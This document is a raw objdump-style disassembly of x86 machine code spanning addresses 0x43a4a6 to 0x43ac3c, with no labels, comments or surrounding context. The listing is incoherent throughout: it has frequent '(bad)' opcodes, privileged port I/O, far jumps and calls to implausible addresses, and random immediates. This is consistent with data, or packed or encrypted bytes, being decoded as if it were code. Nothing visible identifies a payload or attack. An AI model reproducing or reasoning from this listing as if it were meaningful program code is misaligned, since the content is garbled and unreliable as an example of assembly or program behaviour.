  43a4a6:	call   0xfa1c67ca
  43a4ab:	test   BYTE PTR [ebx],cl
  43a4ad:	leave  
  43a4ae:	jl     0x43a4ff
  43a4b0:	mov    edx,0x876a00d8
  43a4b5:	dec    ecx
  43a4b6:	inc    esp
  43a4b7:	and    al,0x63
  43a4b9:	adc    BYTE PTR [eax-0x1],0xb6
  43a4bd:	jl     0x43a4d1
  43a4bf:	inc    eax
  43a4c0:	jnp    0x43a515
  43a4c2:	les    ecx,FWORD PTR [ebx+esi*8]
  43a4c5:	push   ecx
  43a4c6:	jne    0x43a4c6
  43a4c8:	fmul   QWORD PTR [edx+0x54]
  43a4cb:	and    al,0x73
  43a4cd:	pop    ebp
  43a4ce:	xchg   ecx,eax
  43a4cf:	add    BYTE PTR [ebx-0x28],bh
  43a4d2:	jg     0x43a518
  43a4d4:	xchg   edi,eax
  43a4d5:	call   0xd824d0c2
  43a4da:	stc    
  43a4db:	mov    ebx,ebx
  43a4dd:	stos   DWORD PTR es:[edi],eax
  43a4de:	sbb    BYTE PTR [ecx-0x76cf0ba9],cl
  43a4e4:	add    BYTE PTR [edi],ah
  43a4e6:	hlt    
  43a4e7:	and    BYTE PTR [ebp-0x3a],bl
  43a4ea:	pop    ds
  43a4eb:	or     DWORD PTR [ecx+ebp*4-0x3fffff2b],eax
  43a4f2:	pop    ecx
  43a4f3:	sbb    eax,0x7d062818
  43a4f8:	(bad)  
  43a4f9:	push   esp
  43a4fa:	and    al,BYTE PTR [ebx-0x37af032e]
  43a500:	add    bl,bh
  43a502:	xlat   BYTE PTR ds:[ebx]
  43a503:	mov    eax,DWORD PTR [esp]
  43a506:	dec    esi
  43a507:	mov    ebp,0x11f3cf88
  43a50c:	mov    esp,DWORD PTR [edx-0x1c]
  43a50f:	aaa    
  43a510:	lock jno 0x43a587
  43a513:	xchg   ecx,eax
  43a514:	imul   ecx,DWORD PTR [edx-0x59],0xa4ab83ec
  43a51b:	imul   esp,DWORD PTR [esi+0x6e],0x23
  43a51f:	jo     0x43a545
  43a521:	jle    0x43a5a0
  43a523:	aas    
  43a524:	add    al,0x32
  43a526:	xor    ebx,DWORD PTR [ecx]
  43a528:	pusha  
  43a529:	push   esp
  43a52a:	repnz cld 
  43a52c:	jl     0x43a4cc
  43a52e:	xor    eax,0xbd37bf89
  43a533:	xchg   DWORD PTR [ebx+0x7e],eax
  43a536:	and    ch,BYTE PTR [ebp-0x73d11502]
  43a53c:	dec    ebx
  43a53d:	ds sti 
  43a53f:	sbb    BYTE PTR gs:[edx],ch
  43a542:	das    
  43a543:	fdiv   st(4),st
  43a545:	jge    0x43a57d
  43a547:	loop   0x43a5b6
  43a549:	add    BYTE PTR [esi+eiz*4-0x51b9db91],ch
  43a550:	les    ecx,FWORD PTR [eax]
  43a552:	out    0xa9,eax
  43a554:	add    eax,DWORD PTR [eax]
  43a556:	(bad)  
  43a557:	enter  0x5b14,0xb7
  43a55b:	lods   eax,DWORD PTR ds:[esi]
  43a55c:	aas    
  43a55d:	and    al,0x8e
  43a55f:	rcl    BYTE PTR [ecx-0x6eef79ad],0x4b
  43a566:	jle    0x43a534
  43a568:	in     al,0x7a
  43a56a:	loop   0x43a5e7
  43a56c:	add    al,BYTE PTR [ebx-0x7aaa01de]
  43a572:	sahf   
  43a573:	aam    0x20
  43a575:	call   0xf946b9a4
  43a57a:	push   ecx
  43a57b:	mul    esp
  43a57d:	and    DWORD PTR [edx+0x30],0x4
  43a581:	xchg   BYTE PTR [esi-0x617ae42c],bl
  43a587:	fld    st(5)
  43a589:	xor    esi,DWORD PTR ds:0x3f0c8ed6
  43a58f:	(bad)  
  43a590:	int3   
  43a591:	xor    DWORD PTR [edi],0xffffffd0
  43a594:	jmp    0x10226212
  43a599:	jbe    0x43a610
  43a59b:	dec    esi
  43a59c:	and    BYTE PTR [esi],ch
  43a59e:	mov    eax,ds:0xf55cd1af
  43a5a3:	and    dh,cl
  43a5a5:	ins    DWORD PTR es:[edi],dx
  43a5a6:	mov    ds:0x2f5739c1,al
  43a5ab:	sbb    ch,ch
  43a5ad:	pop    edi
  43a5ae:	add    BYTE PTR [eax-0x67],dl
  43a5b1:	jmp    0x6411473a
  43a5b6:	push   eax
  43a5b7:	jle    0x43a57b
  43a5b9:	push   ebx
  43a5ba:	sbb    al,0x3a
  43a5bc:	out    dx,al
  43a5bd:	shr    DWORD PTR ds:0x8b91ee92,0x9
  43a5c4:	cmc    
  43a5c5:	shr    DWORD PTR [edx+edi*2],1
  43a5c8:	xor    BYTE PTR [edx],ah
  43a5ca:	add    DWORD PTR [ebx+0x1a],edi
  43a5cd:	jae    0x43a647
  43a5cf:	ds mov ebp,0xc1468062
  43a5d5:	sbb    BYTE PTR [esi],0xdf
  43a5d8:	or     edx,DWORD PTR [edx+0x771ada9a]
  43a5de:	lea    esi,[eax]
  43a5e0:	dec    esp
  43a5e1:	push   ds
  43a5e2:	sub    BYTE PTR [edx+0x2eec654e],dl
  43a5e8:	call   0xfa5d:0x28e7015e
  43a5ef:	mov    cl,0xc3
  43a5f1:	mov    dh,0x8c
  43a5f3:	adc    esp,DWORD PTR [eax+0x6f]
  43a5f6:	add    al,0x62
  43a5f8:	fst    DWORD PTR [ecx-0x1a]
  43a5fb:	adc    bl,BYTE PTR [edx]
  43a5fd:	aaa    
  43a5fe:	lea    ebp,[ebx]
  43a600:	dec    edi
  43a601:	add    DWORD PTR [ecx],edx
  43a603:	(bad)  
  43a604:	scas   al,BYTE PTR es:[edi]
  43a605:	ja     0x43a635
  43a607:	arpl   WORD PTR [esi+0x45],cx
  43a60a:	int    0x41
  43a60c:	xor    DWORD PTR [ebp-0x74df9ce9],esp
  43a612:	sub    al,BYTE PTR [eax]
  43a614:	cmp    DWORD PTR [edi+0x55],0xffffffb2
  43a618:	ficom  WORD PTR ds:0x8a312a35
  43a61e:	push   ebx
  43a61f:	xchg   esp,eax
  43a620:	cmp    edx,DWORD PTR [edx+0x45]
  43a623:	int    0x71
  43a625:	mov    BYTE PTR [ebp-0x4636826b],al
  43a62b:	jle    0x43a68e
  43a62d:	fld    DWORD PTR [eax]
  43a62f:	rcr    DWORD PTR [eax-0x212907df],1
  43a635:	sub    DWORD PTR [ebx],esi
  43a637:	mov    dl,0xdc
  43a639:	daa    
  43a63a:	ins    DWORD PTR es:[edi],dx
  43a63b:	add    eax,0xd91c8def
  43a640:	pop    es
  43a641:	shl    DWORD PTR [ebx],0x9b
  43a644:	ficomp WORD PTR [edx+0x56]
  43a647:	mov    dh,0x8c
  43a649:	push   esi
  43a64a:	rcr    DWORD PTR [edi+ecx*2],cl
  43a64d:	dec    esi
  43a64e:	and    eax,0x3c1fe6d8
  43a653:	pushf  
  43a654:	idiv   BYTE PTR [edx-0x5a9d0a96]
  43a65a:	sbb    al,0xe1
  43a65c:	in     al,dx
  43a65d:	cdq    
  43a65e:	cld    
  43a65f:	sbb    BYTE PTR [ebx-0x14],ah
  43a662:	pusha  
  43a663:	fbld   TBYTE PTR [ecx+0x55a583d9]
  43a669:	pop    esp
  43a66a:	rcr    ebp,0x68
  43a66d:	xchg   esi,eax
  43a66e:	mov    edi,0x73147701
  43a673:	dec    ebx
  43a674:	ds pop ss
  43a676:	mov    bl,0xe8
  43a678:	add    dh,dl
  43a67a:	and    ch,cl
  43a67c:	add    BYTE PTR [edx+ebx*2-0x6],bl
  43a680:	call   DWORD PTR [ecx-0x9a1a6e3]
  43a686:	mov    ch,0x4f
  43a688:	pop    ecx
  43a689:	cmp    BYTE PTR [ebp+0xe705752],ch
  43a68f:	or     ecx,0xffffffcf
  43a692:	mov    DWORD PTR [ebx-0x173c300a],0xf9d9d42e
  43a69c:	mov    esp,DWORD PTR [ebx+0x5f]
  43a69f:	stc    
  43a6a0:	jne    0x43a661
  43a6a2:	into   
  43a6a3:	shr    bl,0xa3
  43a6a6:	mov    dl,0x7d
  43a6a8:	xlat   BYTE PTR ds:[ebx]
  43a6a9:	xchg   edx,eax
  43a6aa:	je     0x43a6a4
  43a6ac:	dec    ebx
  43a6ae:	add    al,0x27
  43a6b0:	not    DWORD PTR [eax+ebx*1+0x3541cf7d]
  43a6b7:	loopne 0x43a675
  43a6b9:	adc    eax,0xc88af918
  43a6be:	add    al,0xa
  43a6c0:	push   0xffffff8b
  43a6c2:	retf   
  43a6c3:	(bad)  
  43a6c4:	mov    ecx,0xdd33
  43a6c9:	mov    ds:0xc4fff1ef,eax
  43a6ce:	mov    eax,0xb2c85b5a
  43a6d3:	jge    0x43a6c1
  43a6d5:	sub    ch,BYTE PTR [esi+0x16005752]
  43a6db:	mov    edx,DWORD PTR [ebp+0x0]
  43a6de:	out    0x55,eax
  43a6e0:	pop    DWORD PTR [eax]
  43a6e2:	dec    ebx
  43a6e3:	fsub   st(0),st
  43a6e5:	daa    
  43a6e6:	rcr    DWORD PTR [eax],cl
  43a6e8:	stc    
  43a6e9:	mov    ecx,ebx
  43a6eb:	(bad)
  43a6f0:	inc    ebx
  43a6f1:	cld    
  43a6f2:	adc    edi,ebp
  43a6f4:	and    eax,0xef4962d2
  43a6f9:	out    dx,al
  43a6fa:	(bad)  
  43a6fc:	jns    0x43a705
  43a6fe:	pop    ebx
  43a6ff:	dec    ebp
  43a700:	clc    
  43a701:	ins    DWORD PTR es:[edi],dx
  43a702:	pop    esi
  43a703:	mov    edi,edi
  43a705:	in     al,0x5b
  43a707:	jnp    0x43a6cf
  43a709:	out    0x76,eax
  43a70b:	dec    eax
  43a70c:	idiv   eax
  43a70e:	xor    eax,edi
  43a710:	push   edi
  43a711:	test   DWORD PTR [eax+ebx*2],ebx
  43a714:	lds    edi,FWORD PTR [ecx+edx*4-0xf7ab0a8]
  43a71b:	jl     0x43a6e2
  43a71d:	jae    0x43a6b1
  43a71f:	test   esi,ebp
  43a721:	jae    0x43a6a9
  43a723:	imul   ebp,esi,0x10
  43a726:	fincstp 
  43a728:	in     al,0x98
  43a72a:	inc    esp
  43a72b:	pop    es
  43a72c:	test   DWORD PTR [edx+edi*4+0x5e72f684],0x7ae4dbf4
  43a737:	fmul   DWORD PTR [ebx+0x388ebd0]
  43a73d:	add    BYTE PTR [edx+0x2a],ah
  43a740:	mov    ds:0x569500f1,al
  43a745:	mov    ecx,eax
  43a747:	fsubr  DWORD PTR [ecx-0x14]
  43a74a:	sub    al,BYTE PTR [edi+eax*2]
  43a74d:	mul    esp
  43a74f:	push   edx
  43a750:	in     al,dx
  43a751:	cld    
  43a752:	sub    al,0x90
  43a754:	js     0x43a6ea
  43a756:	jmp    FWORD PTR [ebp+0x1]
  43a759:	in     al,dx
  43a75a:	xchg   BYTE PTR [esi+eiz*2-0x9],ch
  43a75e:	test   DWORD PTR [edx],edi
  43a760:	rcl    BYTE PTR [esi-0x7a],0x21
  43a764:	mov    esp,0x5cd952c3
  43a769:	dec    ebp
  43a76a:	dec    edi
  43a76b:	lods   al,BYTE PTR ds:[esi]
  43a76c:	out    dx,eax
  43a76d:	mov    esi,esi
  43a76f:	out    dx,eax
  43a770:	fnstenv [edi+edi*8+0x3ea73ec]
  43a777:	bound  eax,QWORD PTR [ecx]
  43a779:	js     0x43a771
  43a77b:	sub    dl,BYTE PTR [edi]
  43a77d:	arpl   bx,si
  43a77f:	loopne 0x43a790
  43a781:	mov    dh,0x1c
  43a783:	fistp  WORD PTR [ebp+esi*1+0x13511c32]
  43a78a:	add    al,0x62
  43a78c:	fldcw  WORD PTR [esi]
  43a78e:	hlt    
  43a78f:	loopne 0x43a7bc
  43a791:	xchg   ebp,eax
  43a792:	or     al,0x2d
  43a794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a795:	adc    eax,0xe7606671
  43a79a:	jmp    0x94b4:0xeb18625c
  43a7a1:	(bad)  
  43a7a2:	std    
  43a7a3:	xchg   BYTE PTR [edi],cl
  43a7a5:	xchg   edi,eax
  43a7a6:	mov    al,BYTE PTR [eax]
  43a7a8:	mov    ds:0x16c220b7,eax
  43a7ad:	scas   eax,DWORD PTR es:[edi]
  43a7ae:	mov    cs,WORD PTR [edx+0x78b15ccf]
  43a7b4:	xchg   DWORD PTR [eax+edx*8+0x78],ebx
  43a7b8:	jnp    0x43a73a
  43a7ba:	xlat   BYTE PTR ds:[ebx]
  43a7bb:	fldenv [esi+edx*1+0x1b388ea]
  43a7c2:	icebp  
  43a7c3:	jge    0x43a760
  43a7c5:	push   ss
  43a7c6:	jae    0x43a7c4
  43a7c8:	loopne 0x43a7e0
  43a7ca:	xor    eax,0xc3323408
  43a7cf:	sub    al,0x10
  43a7d1:	bound  esi,QWORD PTR [edi-0x16263045]
  43a7d7:	add    edi,DWORD PTR [edx-0x1b]
  43a7da:	xchg   edi,eax
  43a7db:	std    
  43a7dc:	push   0x62
  43a7de:	xchg   edi,eax
  43a7df:	mov    dh,BYTE PTR ds:0x5b7f5701
  43a7e5:	push   ss
  43a7e6:	xchg   ebx,eax
  43a7e7:	adc    al,0xc4
  43a7e9:	fld    DWORD PTR [eax]
  43a7eb:	mov    edx,0xe99b4f33
  43a7f0:	popa   
  43a7f1:	fld1   
  43a7f3:	pop    edx
  43a7f4:	sub    eax,0xe73f811
  43a7f9:	mov    cl,0x56
  43a7fb:	arpl   WORD PTR [ebx],sp
  43a7fd:	lods   eax,DWORD PTR ds:[esi]
  43a7fe:	ret    
  43a7ff:	mov    ah,0xea
  43a801:	add    DWORD PTR [edx-0x68],edx
  43a804:	scas   eax,DWORD PTR es:[edi]
  43a805:	test   al,0x8b
  43a807:	inc    eax
  43a808:	(bad)  [edx-0x13ff8f0c]
  43a80e:	adc    eax,0x1609e9f8
  43a813:	out    dx,eax
  43a814:	neg    DWORD PTR es:[ecx+esi*8+0x64]
  43a819:	hlt    
  43a81a:	mov    DWORD PTR [edi],ecx
  43a81c:	bound  ebx,QWORD PTR [ebp-0x6d2e94eb]
  43a822:	daa    
  43a823:	pop    edx
  43a824:	(bad)  
  43a825:	rcr    BYTE PTR [edx-0x2d],1
  43a828:	je     0x43a882
  43a82a:	into   
  43a82b:	inc    ebp
  43a82c:	cmc    
  43a82d:	push   ebx
  43a82e:	fisttp QWORD PTR [ecx-0x7421351a]
  43a834:	mov    bh,0xc9
  43a836:	call   0x36ee:0xc4aede75
  43a83d:	fist   DWORD PTR [edi]
  43a83f:	push   edi
  43a840:	mov    al,ds:0xd58baaa2
  43a845:	xor    BYTE PTR [esi+0x7cf8164e],ah
  43a84b:	mov    esi,DWORD PTR [eax+0x10f4aad4]
  43a851:	mov    ss,WORD PTR [ebp-0x11]
  43a854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a855:	jbe    0x43a8b3
  43a857:	icebp  
  43a858:	fs ja  0x43a7e4
  43a85b:	punpckldq mm3,DWORD PTR [edx*1+0x2392d36b]
  43a863:	pop    edx
  43a864:	add    ah,dl
  43a866:	pop    es
  43a867:	adc    edx,0x56
  43a86a:	loopne 0x43a89b
  43a86c:	dec    ebp
  43a86d:	iret   
  43a86e:	mov    bh,ah
  43a870:	mov    BYTE PTR [eax],al
  43a872:	inc    esp
  43a873:	add    bh,bh
  43a875:	mov    ch,BYTE PTR [ebp+0x0]
  43a878:	add    edi,DWORD PTR [ebp-0x74]
  43a87b:	adc    eax,0x61ecf625
  43a880:	ret    0x425e
  43a883:	sbb    DWORD PTR [ebx-0x75],edx
  43a886:	scas   eax,DWORD PTR es:[edi]
  43a887:	pop    ecx
  43a888:	in     al,0xf8
  43a88a:	jmp    0x830a:0x805752a9
  43a891:	leave  
  43a892:	mov    bh,0xc6
  43a894:	xor    esi,0xffffffd7
  43a897:	ret    0xf65d
  43a89a:	add    DWORD PTR [edx-0x2e],esp
  43a89d:	call   0x3d3cac
  43a8a2:	inc    eax
  43a8a3:	adc    BYTE PTR [ebx+0x26dc56ff],al
  43a8a9:	(bad)  [eax-0x44]
  43a8ac:	push   edx
  43a8ad:	push   0xffffffd7
  43a8af:	popa   
  43a8b0:	rcr    DWORD PTR [ecx+0x63],1
  43a8b3:	into   
  43a8b4:	repz (bad) 
  43a8b6:	mov    esp,0xa38ac964
  43a8bb:	add    eax,0x108c7cb7
  43a8c0:	fisttp QWORD PTR [esi]
  43a8c2:	and    ebp,ebx
  43a8c4:	pop    esi
  43a8c5:	fs cwde 
  43a8c7:	cs dec edi
  43a8c9:	call   0x3cb27a
  43a8ce:	add    DWORD PTR ds:0x1c015e59,esi
  43a8d4:	dec    ebp
  43a8d5:	mov    eax,DWORD PTR [eax]
  43a8d7:	out    0xb2,al
  43a8d9:	mov    ch,0x83
  43a8db:	dec    edi
  43a8dc:	mov    ecx,0xf662fffc
  43a8e1:	and    DWORD PTR [ebp-0x407f055d],eax
  43a8e7:	into   
  43a8e8:	cld    
  43a8e9:	cs (bad) 
  43a8eb:	loop   0x43a906
  43a8ed:	add    al,0x73
  43a8ef:	push   edi
  43a8f0:	xor    BYTE PTR [edi+edi*8+0x3d],0xe
  43a8f5:	or     DWORD PTR [edi],edi
  43a8f7:	jns    0x43a947
  43a8f9:	sbb    BYTE PTR [esi+esi*4],al
  43a8fc:	inc    DWORD PTR [ebx-0x1b]
  43a8ff:	cmp    DWORD PTR [edx-0x19],eax
  43a902:	add    BYTE PTR [ecx-0x3e],dl
  43a905:	out    0xfc,eax
  43a907:	call   0x6701b54c
  43a90c:	add    dl,BYTE PTR [ebx-0x7b]
  43a90f:	or     eax,DWORD PTR [edx-0x189ffc5]
  43a915:	sub    eax,0x511b09c0
  43a91a:	stc    
  43a91b:	jbe    0x43a93b
  43a91d:	add    al,ch
  43a91f:	stos   BYTE PTR es:[edi],al
  43a920:	jmp    0xea81:0xd9e9f8fb
  43a927:	dec    edi
  43a928:	push   es
  43a929:	sar    BYTE PTR cs:[ecx-0x26adb0b9],0xbc
  43a931:	in     al,0x30
  43a933:	dec    ebp
  43a934:	add    al,0xfb
  43a936:	test   BYTE PTR ds:0x6f8906,ah
  43a93c:	arpl   WORD PTR [ebp+0x15d7085a],ax
  43a942:	sub    ah,BYTE PTR ds:0x4f06fea8
  43a948:	xor    ch,dh
  43a94a:	sti    
  43a94b:	adc    ch,BYTE PTR [esi]
  43a94d:	sub    al,0x44
  43a94f:	add    BYTE PTR [ebx],bh
  43a951:	rol    DWORD PTR [eax],cl
  43a953:	test   DWORD PTR ds:0x66c37efe,edx
  43a959:	fldcw  WORD PTR [edx-0x3]
  43a95c:	ins    BYTE PTR es:[edi],dx
  43a95d:	mov    esi,fs
  43a95f:	mov    ds,WORD PTR [esi+0x1]
  43a962:	out    dx,eax
  43a963:	ja     0x43a9c0
  43a965:	adc    ebp,DWORD PTR [ebx+0x26]
  43a968:	bound  edx,QWORD PTR [edx]
  43a96a:	das    
  43a96b:	add    BYTE PTR [edi-0x25],al
  43a96e:	jb     0x43a93e
  43a970:	cmp    eax,0x3afaf2ad
  43a975:	mov    ah,0x39
  43a977:	add    al,0x8f
  43a979:	mov    ah,0xbe
  43a97b:	lds    esp,FWORD PTR [ecx-0x27]
  43a97e:	jb     0x43a9cf
  43a980:	jle    0x43a95f
  43a982:	sbb    al,ah
  43a984:	in     al,0xd8
  43a986:	pusha  
  43a987:	inc    esp
  43a988:	pop    esi
  43a989:	pusha  
  43a98a:	test   eax,0x3697d90b
  43a98f:	add    bh,0x7f
  43a992:	jmp    0x2be114f2
  43a997:	mov    WORD PTR [eiz*8-0x22503b8e],?
  43a99e:	jmp    0xbdd4aa31
  43a9a3:	in     eax,0x8e
  43a9a5:	fbld   TBYTE PTR [ecx-0x17]
  43a9a8:	mov    ss,WORD PTR [edi+0x664470dd]
  43a9ae:	pop    esi
  43a9af:	lods   al,BYTE PTR ds:[esi]
  43a9b0:	or     ebx,ebp
  43a9b2:	cwde   
  43a9b3:	loope  0x43a9eb
  43a9b5:	mov    ds:0x778cec60,al
  43a9ba:	fnsave [eax+0x46]
  43a9bd:	pop    edx
  43a9be:	pop    ss
  43a9bf:	fiadd  WORD PTR [ebx]
  43a9c1:	stos   DWORD PTR es:[edi],eax
  43a9c2:	lea    eax,ds:0xfd8d9b0c
  43a9c8:	or     ebx,DWORD PTR [ebx-0x71141a78]
  43a9ce:	adc    ch,dl
  43a9d0:	add    eax,esp
  43a9d2:	loope  0x43a9d4
  43a9d4:	jmp    0x59905ef
  43a9d9:	dec    esi
  43a9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a9db:	mov    edx,DWORD PTR ds:0xea4fe542
  43a9e1:	mov    WORD PTR [ebp-0x57b16f75],fs
  43a9e7:	add    cl,ch
  43a9e9:	popa   
  43a9ea:	pop    ebp
  43a9eb:	sar    esp,0x4d
  43a9ee:	(bad)
  43a9f1:	jl     0x43a99a
  43a9f3:	idiv   ebp
  43a9f5:	pop    ebp
  43a9f6:	cmc    
  43a9f7:	mov    esi,DWORD PTR [esi+0x51c863a]
  43a9fd:	addr16 push es
  43a9ff:	dec    edi
  43aa00:	pop    esi
  43aa01:	push   ebp
  43aa02:	mov    ch,0xe
  43aa04:	test   eax,0xbc946100
  43aa09:	fst    QWORD PTR [esi-0x50]
  43aa0c:	cld    
  43aa0d:	mov    esi,0xe5585a66
  43aa12:	(bad)  
  43aa13:	pop    ss
  43aa14:	push   edi
  43aa15:	xchg   esi,eax
  43aa16:	xchg   esp,eax
  43aa17:	lods   al,BYTE PTR ds:[esi]
  43aa18:	ret    0x61dd
  43aa1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa1c:	dec    edi
  43aa1d:	jb     0x43aa10
  43aa1f:	pop    esp
  43aa20:	ja     0x43aa07
  43aa22:	pop    esi
  43aa23:	xchg   ebp,eax
  43aa24:	sbb    al,0xe5
  43aa26:	xor    al,BYTE PTR [ecx]
  43aa28:	push   cs
  43aa29:	jmp    0x29c0838f
  43aa2e:	cmp    eax,0xb72933dd
  43aa33:	(bad)  [ebx-0x3689911]
  43aa39:	pop    edi
  43aa3a:	cmp    ch,bl
  43aa3c:	push   edi
  43aa3d:	inc    edi
  43aa3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aa3f:	aad    0x0
  43aa41:	jb     0x43aaa8
  43aa43:	mov    ebp,0x5c333efc
  43aa48:	cli    
  43aa49:	adc    ah,BYTE PTR [ebx]
  43aa4b:	loope  0x43aabb
  43aa4d:	add    BYTE PTR [edi+0x64],bl
  43aa50:	dec    ecx
  43aa51:	or     al,0xf6
  43aa53:	xchg   cl,bh
  43aa55:	test   DWORD PTR [ebx-0x3208f77f],edi
  43aa5b:	mov    esp,0x4ca03f0
  43aa60:	test   BYTE PTR [edx-0x742d9b35],0x4
  43aa67:	add    eax,0xe4007aac
  43aa6c:	adc    DWORD PTR [eax+eax*8+0x777f104f],eax
  43aa73:	push   ebx
  43aa74:	dec    ebp
  43aa75:	neg    DWORD PTR [esi+0x55]
  43aa78:	pop    ss
  43aa79:	add    al,0x0
  43aa7b:	rcl    al,0x1c
  43aa7e:	add    al,0x80
  43aa80:	pushf  
  43aa81:	cld    
  43aa82:	jne    0x43aac3
  43aa84:	mov    eax,0x37640eeb
  43aa8a:	add    al,0xfb
  43aa8c:	(bad)  [esi+0x7daafb08]
  43aa92:	icebp  
  43aa93:	nop
  43aa94:	loop   0x43aa7e
  43aa96:	lock mov cl,0x11
  43aa99:	stc    
  43aa9a:	xor    ecx,DWORD PTR [ebx+0x63]
  43aa9d:	add    cl,BYTE PTR [ecx+0x467f10bd]
  43aaa3:	repz mov dl,0xb5
  43aaa6:	int3   
  43aaa7:	push   ds
  43aaa8:	pop    esi
  43aaa9:	in     al,dx
  43aaaa:	push   ecx
  43aaab:	inc    eax
  43aaac:	mov    ds:0x10ed8b14,al
  43aab1:	pop    esi
  43aab2:	add    DWORD PTR [esi],esi
  43aab4:	iret   
  43aab5:	stc    
  43aab6:	push   eax
  43aab7:	fsubr  QWORD PTR [ebx+0x5048d2f9]
  43aabd:	or     BYTE PTR [ebx+0xf73d6c3],al
  43aac3:	mov    ah,0x3e
  43aac5:	inc    ebx
  43aac6:	jmp    DWORD PTR [edx+0x7b]
  43aac9:	dec    ecx
  43aaca:	or     bl,ch
  43aacc:	add    DWORD PTR [ebx],esi
  43aace:	rol    BYTE PTR [eax],0xd9
  43aad1:	sbb    eax,0xe8d9bd5a
  43aad6:	sbb    BYTE PTR [ebp+0x4e472a24],al
  43aadc:	jne    0x43ab50
  43aade:	test   bl,al
  43aae0:	pop    edx
  43aae1:	outs   dx,DWORD PTR ds:[esi]
  43aae2:	aad    0x14
  43aae4:	mov    ds:0x215ae18b,al
  43aae9:	int    0x8b
  43aaeb:	jmp    0x43aaa0
  43aaed:	rol    DWORD PTR [esi+0x51],cl
  43aaf0:	fstp   DWORD PTR [ecx-0x76]
  43aaf3:	inc    edx
  43aaf4:	inc    esi
  43aaf5:	mov    ebp,ebp
  43aaf7:	dec    edi
  43aaf8:	and    eax,0x35fff8bd
  43aafd:	add    al,BYTE PTR [eax+ebp*8]
  43ab00:	pop    es
  43ab01:	ja     0x43aaf2
  43ab03:	clc    
  43ab04:	(bad)  [eax+esi*8+0x7c]
  43ab08:	inc    BYTE PTR es:[eax-0x76297041]
  43ab0f:	dec    edx
  43ab10:	push   cs
  43ab11:	jno    0x43aaff
  43ab13:	lea    eax,ds:0x267cefcf
  43ab19:	inc    BYTE PTR [eax-0x74d99041]
  43ab1f:	push   edx
  43ab20:	out    dx,al
  43ab21:	mov    cl,BYTE PTR [ecx+0x8]
  43ab24:	test   ecx,eax
  43ab26:	loop   0x43ab2f
  43ab28:	imul   edx,ebx,0x4b73874e
  43ab2e:	mov    esp,edx
  43ab30:	das    
  43ab31:	ret    
  43ab32:	mov    edx,DWORD PTR [edx+0x0]
  43ab35:	pop    edx
  43ab36:	outs   dx,DWORD PTR ds:[esi]
  43ab37:	dec    esi
  43ab38:	shl    DWORD PTR [eax+0x2],0x4
  43ab3c:	add    BYTE PTR [edx+0x6b],ah
  43ab3f:	mov    esp,edx
  43ab41:	psubusw mm5,QWORD PTR [edx-0x59e36639]
  43ab48:	(bad)  
  43ab49:	test   eax,0x898b351c
  43ab4e:	test   eax,0x64334e3a
  43ab53:	ret    0x2088
  43ab56:	or     eax,0x182df473
  43ab5b:	and    eax,0xea0f75f8
  43ab60:	add    edi,DWORD PTR [edx-0x6b]
  43ab63:	sahf   
  43ab64:	imul   BYTE PTR [edx+0x63]
  43ab67:	and    eax,0xe615def8
  43ab6c:	mov    ch,BYTE PTR [edx*2+0x5c5b70aa]
  43ab73:	sub    eax,0xba0194f8
  43ab78:	idiv   BYTE PTR [edx]
  43ab7a:	packsswb mm1,QWORD PTR [eax+0x36]
  43ab7e:	pop    ebx
  43ab7f:	sahf   
  43ab80:	jmp    esi
  43ab82:	sub    BYTE PTR [ecx],ch
  43ab84:	loope  0x43abe3
  43ab86:	loop   0x43abcb
  43ab88:	sbb    ch,0x84
  43ab8b:	fimul  WORD PTR [eax-0x1445f260]
  43ab91:	jae    0x43aba1
  43ab93:	aas    
  43ab94:	neg    dh
  43ab96:	pushf  
  43ab97:	xor    eax,0xd6210082
  43ab9c:	sub    ah,ah
  43ab9e:	gs loop 0x43abb1
  43aba1:	sub    BYTE PTR [ebp-0x67773a7c],0xd
  43aba8:	mov    ecx,0xf0fdbeb
  43abad:	not    BYTE PTR [esi+0x15]
  43abb0:	fiadd  WORD PTR [eax-0x752a7af3]
  43abb6:	xor    BYTE PTR ds:0xae6a4873,cl
  43abbc:	add    BYTE PTR [eax],ch
  43abbe:	ret    
  43abbf:	out    0x3,al
  43abc1:	sbb    dl,BYTE PTR [edi]
  43abc3:	push   esi
  43abc4:	adc    al,BYTE PTR [edx-0x25]
  43abc7:	sti    
  43abc8:	push   ebp
  43abc9:	stos   BYTE PTR es:[edi],al
  43abca:	jmp    0x43ab77
  43abcc:	or     BYTE PTR [esi],dh
  43abce:	sub    al,0x18
  43abd0:	add    ebp,ecx
  43abd2:	popa   
  43abd3:	fld    DWORD PTR [eax]
  43abd5:	and    bl,bl
  43abd7:	sti    
  43abd8:	push   ebp
  43abd9:	stos   BYTE PTR es:[edi],al
  43abda:	stos   BYTE PTR es:[edi],al
  43abdb:	and    al,ch
  43abdd:	sbb    al,0xeb
  43abdf:	add    al,BYTE PTR [ebp+edi*4+0x3e4e9c5a]
  43abe6:	fild   DWORD PTR [esi]
  43abe8:	xchg   BYTE PTR [edx+ebx*2],ah
  43abeb:	push   ebp
  43abec:	repnz cmp DWORD PTR [edi],edx
  43abef:	fwait
  43abf0:	hlt    
  43abf1:	jmp    0x91448557
  43abf6:	adc    edx,DWORD PTR [eax]
  43abf8:	clc    
  43abf9:	jle    0x43abe6
  43abfb:	adc    eax,0x3a002c8c
  43ac00:	test   BYTE PTR [di+0x5462],ah
  43ac05:	fnstenv [eax-0x6b]
  43ac08:	adc    DWORD PTR [esi+0x30],edi
  43ac0b:	(bad)  
  43ac0c:	jecxz  0x43ab93
  43ac0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ac0f:	or     eax,0x1471e89f
  43ac14:	adc    eax,edi
  43ac16:	push   0x22
  43ac18:	fimul  DWORD PTR [ebx-0xb6514cf]
  43ac1e:	push   eax
  43ac1f:	pop    edi
  43ac20:	xor    eax,0xaa58e1c3
  43ac25:	clc    
  43ac26:	sub    dh,bh
  43ac28:	aad    0xb
  43ac2a:	inc    ecx
  43ac2b:	pop    ebp
  43ac2c:	pop    ss
  43ac2d:	outs   dx,BYTE PTR ds:[esi]
  43ac2e:	out    0xdc,eax
  43ac30:	stos   BYTE PTR es:[edi],al
  43ac31:	hlt    
  43ac32:	mov    ebx,0xf687b9
  43ac37:	pop    esp
  43ac38:	add    al,0x75
  43ac3a:	(bad)  
  43ac3b:	(bad)  
  43ac3c:	pusha  
